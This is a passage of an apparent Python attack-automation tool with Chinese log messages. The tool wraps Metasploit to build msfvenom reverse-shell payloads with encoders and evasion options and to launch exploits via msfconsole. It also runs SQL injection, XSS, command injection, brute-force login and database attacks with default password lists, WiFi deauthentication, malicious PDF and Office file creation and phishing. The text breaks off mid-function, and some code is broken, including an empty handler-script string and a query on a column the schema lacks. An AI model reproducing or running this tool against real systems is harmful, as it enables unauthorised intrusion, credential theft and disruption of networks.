#!/usr/bin/env python3

import os
import sys
import json
import time
import hashlib
import subprocess
import sqlite3
import re
import readline
import threading
import queue
import tempfile
import base64
import zipfile
import xml.etree.ElementTree as ET
import requests
import socket
import struct
from pathlib import Path
from datetime import datetime, timedelta
import argparse
from urllib.parse import urlparse
import ipaddress
import random
import string
from functools import wraps
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def retry_on_failure(max_retries=3, delay=1):
    
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_retries - 1:
                        raise e
                    logger.warning(f"函数 {func.__name__} 执行失败，第 {attempt + 1} 次重试: {e}")
                    time.sleep(delay)
            return None
        return wrapper
    return decorator

class MSFModuleManager:

    def __init__(self, cache_dir=".msf_cache", cache_ttl=7200):
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(exist_ok=True)
        self.cache_ttl = cache_ttl
        self.msf_path = self._find_msf_path()
        self.db_path = self.cache_dir / "msf_modules.db"
        self._init_database()
    
    def _find_msf_path(self):
        
        possible_paths = [
            "/usr/share/metasploit-framework",
            "/opt/metasploit-framework", 
            "/var/lib/metasploit-framework",
            os.path.expanduser("~/metasploit-framework"),
            "/usr/local/share/metasploit-framework"
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    
    def _init_database(self):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 创建MSF模块表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS msf_modules (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    type TEXT NOT NULL,
                    platform TEXT,
                    description TEXT,
                    options TEXT,
                    rank TEXT,
                    disclosure_date TEXT
                )
            ''')
            
            # 创建缓存元数据表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS cache_metadata (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    key TEXT UNIQUE NOT NULL,
                    value TEXT,
                    last_updated TEXT NOT NULL
                )
            ''')
            
            # 创建目标表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    hostname TEXT,
                    os TEXT,
                    status TEXT DEFAULT 'new',
                    services_json TEXT DEFAULT '{}',
                    vulnerabilities_json TEXT DEFAULT '{}',
                    notes TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # 创建目标组表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS target_groups (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    description TEXT,
                    targets_json TEXT DEFAULT '{}',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # 创建扫描结果表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT NOT NULL,
                    scan_type TEXT NOT NULL,
                    results_json TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
        except sqlite3.Error as e:
            logger.error(f"数据库初始化失败: {e}")
        finally:
            conn.close()

    def get_all_modules(self, force_update=False):
        
        module_types = [
            "exploits", "payloads", "auxiliary", "post", 
            "encoders", "nops", "evasion"
        ]
        
        all_modules = {}
        for module_type in module_types:
            print(f"\n正在处理 {module_type} 模块...")
            modules = self.get_msf_modules(module_type, force_update)
            all_modules[module_type] = modules
        
        return all_modules

    def get_msf_modules(self, module_type, force_update=False):
        
        if not force_update and not self._should_update_cache(module_type):
            return self._get_cached_modules(module_type)
        
        print(f"正在从MSF获取{module_type}模块列表...")
        modules = self._fetch_modules_from_msf(module_type)
        
        if modules:
            self._cache_modules(module_type, modules)
            self._update_cache_metadata(module_type)
            print(f"成功获取 {len(modules)} 个{module_type}模块")
        else:
            print(f"无法获取{module_type}模块，使用缓存数据")
            modules = self._get_cached_modules(module_type)
        
        return modules

    @retry_on_failure(max_retries=3, delay=2)
    def _fetch_modules_from_msf(self, module_type):
        
        try:
            cmd = ["msfconsole", "-qx", f"show {module_type}; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            
            if result.returncode != 0:
                logger.error(f"获取{module_type}模块失败: {result.stderr}")
                return None
            
            return self._parse_msf_output(result.stdout, module_type)
            
        except subprocess.TimeoutExpired:
            logger.error(f"获取{module_type}模块超时")
            return None
        except Exception as e:
            logger.error(f"获取{module_type}模块时出错: {e}")
            return None

    def _parse_msf_output(self, output, module_type):
        
        modules = []
        lines = output.split('\n')
        start_parsing = False
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('---'):
                start_parsing = True
                continue
            
            if not start_parsing or not line:
                continue
            
            parts = line.split()
            if parts:
                module_name = parts[0]
                if '/' in module_name:
                    module_info = {
                        'name': module_name,
                        'type': module_type,
                        'platform': self._extract_platform(module_name),
                        'description': ' '.join(parts[1:]) if len(parts) > 1 else 'No description',
                        'options': self._get_module_options(module_name, module_type),
                        'rank': self._extract_rank(line),
                        'disclosure_date': self._extract_disclosure_date(line)
                    }
                    modules.append(module_info)
        
        return modules

    def _extract_platform(self, module_name):
        
        platforms = {
            'windows': 'windows',
            'linux': 'linux', 
            'osx': 'osx',
            'unix': 'unix',
            'android': 'android',
            'php': 'php',
            'java': 'java',
            'python': 'python',
            'ruby': 'ruby',
            'net': 'net',
            'solaris': 'solaris',
            'bsd': 'bsd',
            'cisco': 'cisco',
            'ios': 'ios',
            'aix': 'aix',
            'hpux': 'hpux',
            'irix': 'irix'
        }
        
        module_lower = module_name.lower()
        for key, value in platforms.items():
            if key in module_lower:
                return value
        return 'multi'

    def _extract_rank(self, line):
        
        ranks = ['excellent', 'great', 'good', 'normal', 'average', 'low', 'manual']
        line_lower = line.lower()
        for rank in ranks:
            if rank in line_lower:
                return rank
        return 'normal'

    def _extract_disclosure_date(self, line):
        
        date_pattern = r'\d{4}-\d{2}-\d{2}'
        match = re.search(date_pattern, line)
        return match.group() if match else ''

    @retry_on_failure(max_retries=2, delay=1)
    def _get_module_options(self, module_name, module_type):
        
        try:
            cmd = ["msfconsole", "-qx", f"use {module_name}; show options; show advanced; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            options = {}
            if result.returncode == 0:
                options = self._parse_module_options(result.stdout)
            
            return options
            
        except Exception as e:
            logger.error(f"获取模块选项失败 {module_name}: {e}")
            return {}

    def _parse_module_options(self, output):
        
        options = {}
        lines = output.split('\n')
        current_section = 'basic'
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('Module options'):
                current_section = 'basic'
                continue
            elif line.startswith('Advanced options'):
                current_section = 'advanced'
                continue
            elif line.startswith('Payload options'):
                current_section = 'payload'
                continue
            elif line.startswith('---'):
                continue
            
            parts = line.split()
            if len(parts) >= 4 and parts[0] not in ['Name', '----', 'Current', 'Setting']:
                option_name = parts[0]
                options[option_name] = {
                    'current_setting': parts[1] if len(parts) > 1 else '',
                    'required': parts[2] if len(parts) > 2 else '',
                    'description': ' '.join(parts[3:]) if len(parts) > 3 else '',
                    'section': current_section
                }
        
        return options

    def _should_update_cache(self, module_type):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT last_updated FROM cache_metadata WHERE key = ?", 
                (f"last_update_{module_type}",)
            )
            
            result = cursor.fetchone()
            conn.close()
            
            if not result:
                return True
            
            last_updated = datetime.fromisoformat(result[0])
            return datetime.now() - last_updated > timedelta(seconds=self.cache_ttl)
        except Exception as e:
            logger.error(f"检查缓存更新失败: {e}")
            return True

    def _update_cache_metadata(self, module_type):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 检查是否已存在该记录
            cursor.execute(
                "SELECT 1 FROM cache_metadata WHERE key = ?", 
                (f"last_update_{module_type}",)
            )
            
            if cursor.fetchone():
                # 如果存在则更新
                cursor.execute(
                    "UPDATE cache_metadata SET last_updated = ? WHERE key = ?",
                    (datetime.now().isoformat(), f"last_update_{module_type}")
                )
            else:
                # 如果不存在则插入
                cursor.execute(
                    "INSERT INTO cache_metadata (key, value, last_updated) VALUES (?, ?, ?)",
                    (f"last_update_{module_type}", "updated", datetime.now().isoformat())
                )
            
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            logger.error(f"更新缓存元数据失败: {e}")

    def _cache_modules(self, module_type, modules):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("DELETE FROM msf_modules WHERE type = ?", (module_type,))
            
            for module in modules:
                cursor.execute(
                    "INSERT INTO msf_modules (name, type, platform, description, options, rank, disclosure_date) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                    (
                        module['name'],
                        module['type'],
                        module['platform'],
                        module['description'],
                        json.dumps(module['options']),
                        module['rank'],
                        module['disclosure_date']
                    )
                )
            
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            logger.error(f"缓存模块失败: {e}")

    def _get_cached_modules(self, module_type):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT name, type, platform, description, options_json, rank, disclosure_date FROM msf_modules WHERE type = ?",
                (module_type,)
            )
            
            modules = []
            for row in cursor.fetchall():
                modules.append({
                    'name': row[0],
                    'type': row[1],
                    'platform': row[2],
                    'description': row[3],
                    'options': json.loads(row[4]) if row[4] else {},
                    'rank': row[5],
                    'disclosure_date': row[6]
                })
            
            conn.close()
            return modules
        except sqlite3.Error as e:
            logger.error(f"获取缓存模块失败: {e}")
            return []

    def search_modules(self, query, module_type=None, platform=None, min_rank=None):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            sql = "SELECT name, type, platform, description, options, rank, disclosure_date FROM msf_modules WHERE (name LIKE ? OR description LIKE ?)"
            params = [f'%{query}%', f'%{query}%']
            
            if module_type:
                sql += " AND type = ?"
                params.append(module_type)
            
            if platform:
                sql += " AND platform = ?"
                params.append(platform)
            
            if min_rank:
                rank_order = ['excellent', 'great', 'good', 'normal', 'average', 'low', 'manual']
                min_rank_index = rank_order.index(min_rank)
                valid_ranks = rank_order[:min_rank_index + 1]
                placeholders = ','.join(['?'] * len(valid_ranks))
                sql += f" AND rank IN ({placeholders})"
                params.extend(valid_ranks)
            
            cursor.execute(sql, params)
            
            results = []
            for row in cursor.fetchall():
                results.append({
                    'name': row[0],
                    'type': row[1],
                    'platform': row[2],
                    'description': row[3],
                    'options': json.loads(row[4]) if row[4] else {},
                    'rank': row[5],
                    'disclosure_date': row[6]
                })
            
            conn.close()
            return results
        except sqlite3.Error as e:
            logger.error(f"搜索模块失败: {e}")
            return []

    def get_module_info(self, module_name):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT name, type, platform, description, options_json, rank, disclosure_date FROM msf_modules WHERE name = ?",
                (module_name,)
            )
            
            row = cursor.fetchone()
            conn.close()
            
            if not row:
                return None
            
            return {
                'name': row[0],
                'type': row[1],
                'platform': row[2],
                'description': row[3],
                'options': json.loads(row[4]) if row[4] else {},
                'rank': row[5],
                'disclosure_date': row[6]
            }
        except sqlite3.Error as e:
            logger.error(f"获取模块信息失败: {e}")
            return None

    def get_module_statistics(self):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT type, COUNT(*) FROM msf_modules GROUP BY type")
            type_stats = {row[0]: row[1] for row in cursor.fetchall()}
            
            cursor.execute("SELECT platform, COUNT(*) FROM msf_modules GROUP BY platform")
            platform_stats = {row[0]: row[1] for row in cursor.fetchall()}
            
            cursor.execute("SELECT rank, COUNT(*) FROM msf_modules GROUP BY rank")
            rank_stats = {row[0]: row[1] for row in cursor.fetchall()}
            
            conn.close()
            
            return {
                'by_type': type_stats,
                'by_platform': platform_stats,
                'by_rank': rank_stats
            }
        except sqlite3.Error as e:
            logger.error(f"获取模块统计失败: {e}")
            return {'by_type': {}, 'by_platform': {}, 'by_rank': {}}

    def clear_cache(self):
        
        try:
            import shutil
            if self.cache_dir.exists():
                shutil.rmtree(self.cache_dir)
                self.cache_dir.mkdir(exist_ok=True)
                self._init_database()
                print("缓存已清除")
            else:
                print("缓存目录不存在")
        except Exception as e:
            logger.error(f"清除缓存失败: {e}")

class UltimatePayloadGenerator:

    def __init__(self, module_manager):
        self.module_manager = module_manager
        self.supported_platforms = [
            'windows', 'linux', 'osx', 'android', 'php', 
            'python', 'java', 'ruby', 'net', 'solaris', 'bsd'
        ]
    
    def generate_payload(self, platform, arch, payload_type, lhost, lport, output_format, output_file, 
                        encoder=None, iterations=1, bad_chars=None, template_path=None, 
                        advanced_options=None):

        cmd = ["msfvenom"]
        
        cmd.extend(["-p", payload_type])
        cmd.append(f"LHOST={lhost}")
        cmd.append(f"LPORT={lport}")
        
        if arch:
            cmd.extend(["-a", arch])
        
        if platform:
            cmd.extend(["--platform", platform])
        
        if output_format:
            cmd.extend(["-f", output_format])
        
        cmd.extend(["-o", output_file])
        
        if encoder and encoder != "不选择编码器":
            cmd.extend(["-e", encoder])
            cmd.extend(["-i", str(iterations)])
        
        if bad_chars:
            cmd.extend(["-b", bad_chars])
        
        if template_path and os.path.exists(template_path):
            cmd.extend(["-x", template_path])
            cmd.append("-k")
        
        if advanced_options:
            if advanced_options.get('nop_generator'):
                cmd.extend(["--nopsled", advanced_options['nop_generator']])
            
            if advanced_options.get('padding_size'):
                cmd.extend(["--pad", str(advanced_options['padding_size'])])
            
            if advanced_options.get('smallest'):
                cmd.append("--smallest")
            
            if advanced_options.get('encrypt'):
                cmd.extend(["--encrypt", advanced_options['encrypt']])
            
            if advanced_options.get('encrypt_key'):
                cmd.extend(["--encrypt-key", advanced_options['encrypt_key']])
        
        return cmd
    
    def get_supported_payloads(self, platform=None, arch=None):
        
        return self.module_manager.search_modules("", module_type="payloads", platform=platform)
    
    def get_encoders(self):
        
        encoders = self.module_manager.get_msf_modules("encoders")
        return ["不选择编码器"] + [encoder['name'] for encoder in encoders]
    
    def get_formats(self):
        
        formats = self.module_manager.get_msf_modules("formats")
        return [fmt['name'] for fmt in formats if fmt['name']]
    
    def get_nops(self):
        
        nops = self.module_manager.get_msf_modules("nops")
        return [nop['name'] for nop in nops if nop['name']]
    
    def get_evasion_modules(self):
        
        evasion = self.module_manager.get_msf_modules("evasion")
        return [evasion_module['name'] for evasion_module in evasion if evasion_module['name']]
    
    def generate_handler_script(self, payload, lhost, lport, output_file, extra_options=None):
        
        script_content = f
        
        if extra_options:
            for key, value in extra_options.items():
                if value:
                    script_content += f"set {key} {value}\n"
        
        script_content += "exploit -j -z\n"
        
        script_file = f"{output_file}.rc"
        with open(script_file, 'w') as f:
            f.write(script_content)
        
        return script_file
    
    def validate_payload_file(self, payload_file):
        
        if not os.path.exists(payload_file):
            return False, "文件不存在"
        
        try:
            file_size = os.path.getsize(payload_file)
            if file_size == 0:
                return False, "文件为空"
            
            with open(payload_file, 'rb') as f:
                file_data = f.read()
                md5_hash = hashlib.md5(file_data).hexdigest()
                sha1_hash = hashlib.sha1(file_data).hexdigest()
                sha256_hash = hashlib.sha256(file_data).hexdigest()
            
            file_type = "未知"
            try:
                result = subprocess.run(['file', payload_file], capture_output=True, text=True, timeout=10)
                file_type = result.stdout.strip()
            except:
                pass
            
            return True, {
                "size": file_size,
                "md5": md5_hash,
                "sha1": sha1_hash,
                "sha256": sha256_hash,
                "type": file_type
            }
        except Exception as e:
            return False, f"验证文件时出错: {e}"

class ExploitManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def search_exploits(self, query=None, platform=None, min_rank='normal'):
        
        return self.module_manager.search_modules(query or "", module_type="exploits", platform=platform, min_rank=min_rank)
    
    def execute_exploit(self, exploit_name, options, output_file=None):
        
        module_info = self.module_manager.get_module_info(exploit_name)
        if not module_info:
            return False, "模块未找到"
        
        commands = [f"use {exploit_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("exploit")
        
        rc_content = "\n".join(commands)
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(rc_content)
            return True, f"RC文件已生成: {output_file}"
        else:
            return self._execute_msf_commands(commands)
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_msf_commands(self, commands):
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, f"执行失败: {result.stderr}"
        except subprocess.TimeoutExpired:
            return False, "命令执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"
    
    def get_exploit_suggestions(self, target_info):
        
        suggestions = []
        
        target_os = target_info.get('os', '').lower()
        if 'windows' in target_os:
            suggestions.extend(self.search_exploits("windows", min_rank="good"))
        elif 'linux' in target_os:
            suggestions.extend(self.search_exploits("linux", min_rank="good"))
        
        services = target_info.get('services', {})
        for port, service in services.items():
            service_lower = service.lower()
            if 'http' in service_lower:
                suggestions.extend(self.search_exploits("http", min_rank="good"))
            elif 'smb' in service_lower:
                suggestions.extend(self.search_exploits("smb", min_rank="good"))
            elif 'ssh' in service_lower:
                suggestions.extend(self.search_exploits("ssh", min_rank="normal"))
        
        seen = set()
        unique_suggestions = []
        for exploit in suggestions:
            if exploit['name'] not in seen:
                seen.add(exploit['name'])
                unique_suggestions.append(exploit)
        
        return unique_suggestions[:10]
    
    def generate_exploit_report(self, exploit_name, target, success, output):
        
        report = {
            "exploit": exploit_name,
            "target": target,
            "success": success,
            "output": output,
            "timestamp": datetime.now().isoformat()
        }
        
        return report

class WebPenetrationManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_web_modules(self):
        
        web_modules = {}
        
        web_modules['scanners'] = self.module_manager.search_modules("http", module_type="auxiliary")
        
        web_modules['exploits'] = self.module_manager.search_modules("http", module_type="exploits")
        
        web_modules['services'] = self.module_manager.search_modules("web", module_type="auxiliary")
        
        return web_modules
    
    def scan_web_application(self, target_url, options=None):
        
        scan_modules = [
            "auxiliary/scanner/http/http_version",
            "auxiliary/scanner/http/robots_txt",
            "auxiliary/scanner/http/dir_scanner",
            "auxiliary/scanner/http/files_dir",
            "auxiliary/scanner/http/backup_file",
            "auxiliary/scanner/http/options"
        ]
        
        results = {}
        parsed_url = urlparse(target_url)
        for module in scan_modules:
            module_options = {
                "RHOSTS": parsed_url.hostname,
                "RPORT": str(parsed_url.port or 80),
                "TARGETURI": parsed_url.path or "/"
            }
            
            if options:
                module_options.update(options)
            
            success, output = self.execute_web_module(module, module_options)
            results[module] = {
                "success": success,
                "output": output,
                "options": module_options
            }
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def execute_web_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=180)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"
    
    def sql_injection_attack(self, target_url, parameters):
        
        sql_modules = [
            "auxiliary/scanner/http/sql_injection",
            "auxiliary/scanner/http/wordpress_login_enum",
            "exploit/multi/http/struts2_rest_xstream"
        ]
        
        results = {}
        target = urlparse(target_url)
        
        for module in sql_modules:
            options = {
                "RHOSTS": target.hostname,
                "RPORT": str(target.port or 80),
                "TARGETURI": target.path or "/"
            }
            
            if parameters:
                for param, value in parameters.items():
                    options[param] = value
            
            success, output = self.execute_web_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def xss_attack(self, target_url, payloads):
        
        xss_modules = [
            "auxiliary/scanner/http/xss",
            "auxiliary/scanner/http/xssed"
        ]
        
        results = {}
        target = urlparse(target_url)
        
        for module in xss_modules:
            options = {
                "RHOSTS": target.hostname,
                "RPORT": str(target.port or 80),
                "TARGETURI": target.path or "/"
            }
            
            if payloads:
                options["PAYLOAD"] = payloads[0]
            
            success, output = self.execute_web_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def file_inclusion_attack(self, target_url):
        
        inclusion_modules = [
            "auxiliary/scanner/http/file_inclusion",
            "exploit/multi/http/apache_normalize_path"
        ]
        
        results = {}
        target = urlparse(target_url)
        
        for module in inclusion_modules:
            options = {
                "RHOSTS": target.hostname,
                "RPORT": str(target.port or 80),
                "TARGETURI": target.path or "/"
            }
            
            success, output = self.execute_web_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def command_injection_attack(self, target_url):
        
        command_modules = [
            "auxiliary/scanner/http/command_injection",
            "exploit/multi/http/php_cgi_arg_injection"
        ]
        
        results = {}
        target = urlparse(target_url)
        
        for module in command_modules:
            options = {
                "RHOSTS": target.hostname,
                "RPORT": str(target.port or 80),
                "TARGETURI": target.path or "/"
            }
            
            success, output = self.execute_web_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def brute_force_login(self, target_url, username_list, password_list):
        
        login_modules = [
            "auxiliary/scanner/http/http_login",
            "auxiliary/scanner/http/wordpress_login_enum",
            "auxiliary/scanner/http/drupal_pps"
        ]
        
        results = {}
        target = urlparse(target_url)
        
        for module in login_modules:
            options = {
                "RHOSTS": target.hostname,
                "RPORT": str(target.port or 80),
                "TARGETURI": target.path or "/",
                "USERNAME": username_list[0] if username_list else "admin",
                "PASS_FILE": self._create_password_file(password_list),
                "USER_FILE": self._create_username_file(username_list) if username_list else None
            }
            
            success, output = self.execute_web_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def _create_password_file(self, passwords):
        
        if not passwords:
            passwords = ["admin", "password", "123456", "root"]
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
        for pwd in passwords:
            temp_file.write(pwd + '\n')
        temp_file.close()
        
        return temp_file.name
    
    def _create_username_file(self, usernames):
        
        if not usernames:
            usernames = ["admin", "root", "test", "user"]
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
        for user in usernames:
            temp_file.write(user + '\n')
        temp_file.close()
        
        return temp_file.name

class DatabaseAttackManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_database_modules(self, db_type=None):
        
        db_keywords = {
            'mysql': 'mysql',
            'mssql': 'mssql', 
            'oracle': 'oracle',
            'postgresql': 'postgres',
            'mongodb': 'mongodb',
            'redis': 'redis'
        }
        
        if db_type and db_type in db_keywords:
            return self.module_manager.search_modules(db_keywords[db_type])
        else:
            all_modules = []
            for keyword in db_keywords.values():
                all_modules.extend(self.module_manager.search_modules(keyword))
            return all_modules
    
    def database_brute_force(self, target_ip, port, db_type, username_list=None, password_list=None):
        
        brute_modules = {
            'mysql': 'auxiliary/scanner/mysql/mysql_login',
            'mssql': 'auxiliary/scanner/mssql/mssql_login',
            'oracle': 'auxiliary/scanner/oracle/oracle_login',
            'postgresql': 'auxiliary/scanner/postgres/postgres_login'
        }
        
        if db_type not in brute_modules:
            return {"error": f"不支持的数据库类型: {db_type}"}
        
        options = {
            "RHOSTS": target_ip,
            "RPORT": str(port),
            "USERNAME": username_list[0] if username_list else db_type,
            "PASS_FILE": self._create_password_file(password_list),
            "USER_FILE": self._create_username_file(username_list) if username_list else None
        }
        
        success, output = self._execute_db_module(brute_modules[db_type], options)
        return {brute_modules[db_type]: {"success": success, "output": output}}
    
    def database_enumeration(self, target_ip, port, db_type, username, password):
        
        enum_modules = {
            'mysql': [
                "auxiliary/scanner/mysql/mysql_version",
                "auxiliary/scanner/mysql/mysql_enum"
            ],
            'mssql': [
                "auxiliary/scanner/mssql/mssql_enum"
            ],
            'oracle': [
                "auxiliary/scanner/oracle/oracle_enum"
            ]
        }
        
        if db_type not in enum_modules:
            return {"error": f"不支持的数据库类型: {db_type}"}
        
        results = {}
        for module in enum_modules[db_type]:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port),
                "USERNAME": username,
                "PASSWORD": password
            }
            
            success, output = self._execute_db_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def database_exploitation(self, target_ip, port, db_type, username, password):
        
        exploit_modules = {
            'mysql': [
                "exploit/mysql/mysql_udf_payload"
            ],
            'mssql': [
                "exploit/windows/mssql/mssql_payload"
            ]
        }
        
        if db_type not in exploit_modules:
            return {"error": f"不支持的数据库类型: {db_type}"}
        
        results = {}
        for module in exploit_modules[db_type]:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port),
                "USERNAME": username,
                "PASSWORD": password
            }
            
            success, output = self._execute_db_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_db_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"
    
    def _create_password_file(self, passwords):
        
        if not passwords:
            passwords = ["root", "password", "admin", "123456"]
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
        for pwd in passwords:
            temp_file.write(pwd + '\n')
        temp_file.close()
        
        return temp_file.name
    
    def _create_username_file(self, usernames):
        
        if not usernames:
            usernames = ["root", "admin", "sa"]
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
        for user in usernames:
            temp_file.write(user + '\n')
        temp_file.close()
        
        return temp_file.name

class WirelessAttackManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_wireless_modules(self):
        
        return self.module_manager.search_modules("wireless")
    
    def wifi_scanning(self, interface="wlan0"):
        
        scan_modules = [
            "auxiliary/scanner/wifi/wifi_scan"
        ]
        
        results = {}
        for module in scan_modules:
            options = {
                "INTERFACE": interface
            }
            
            success, output = self._execute_wireless_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def wifi_deauth_attack(self, target_bssid, interface="wlan0", count=10):
        
        deauth_modules = [
            "auxiliary/dos/wifi/wifi_deauth"
        ]
        
        results = {}
        for module in deauth_modules:
            options = {
                "INTERFACE": interface,
                "BSSID": target_bssid,
                "COUNT": str(count)
            }
            
            success, output = self._execute_wireless_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def wifi_cracking(self, bssid, channel, interface="wlan0"):
        
        crack_modules = [
            "auxiliary/scanner/wifi/wifi_geo"
        ]
        
        results = {}
        for module in crack_modules:
            options = {
                "INTERFACE": interface,
                "BSSID": bssid,
                "CHANNEL": str(channel)
            }
            
            success, output = self._execute_wireless_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def bluetooth_attack(self, target_bdaddr):
        
        bluetooth_modules = [
            "auxiliary/scanner/bluetooth/bluetooth_version"
        ]
        
        results = {}
        for module in bluetooth_modules:
            options = {
                "BD_ADDR": target_bdaddr
            }
            
            success, output = self._execute_wireless_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_wireless_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class SocialEngineeringManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_social_engineering_modules(self):
        
        return self.module_manager.search_modules("auxiliary", module_type="auxiliary") + \
               self.module_manager.search_modules("exploit", module_type="exploits")
    
    def create_malicious_file(self, file_type, payload, output_file, template=None):
        
        file_creators = {
            'pdf': "exploit/multi/fileformat/adobe_pdf_embedded_exe",
            'doc': "exploit/multi/fileformat/office_word_macro",
            'xls': "exploit/multi/fileformat/office_excel_macro",
            'exe': "windows/smb/smb_delivery"
        }
        
        if file_type not in file_creators:
            return False, f"不支持的文件类型: {file_type}"
        
        options = {
            "FILENAME": output_file,
            "PAYLOAD": payload
        }
        
        if template:
            options["TEMPLATE"] = template
        
        return self._execute_se_module(file_creators[file_type], options)
    
    def phishing_attack(self, target_email, subject, body, attachment=None):
        
        phishing_modules = [
            "auxiliary/scanner/http/webmail"
        ]
        
        results = {}
        for module in phishing_modules:
            options = {
                "RHOSTS": "smtp.example.com",
                "EMAIL": target_email,
                "SUBJECT": subject,
                "BODY": body
            }
            
            if attachment:
                options["ATTACHMENT"] = attachment
            
            success, output = self._execute_se_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def website_cloning(self, target_url, local_port=80):
        
        clone_modules = [
            "auxiliary/server/http_ntlmrelay"
        ]
        
        results = {}
        for module in clone_modules:
            options = {
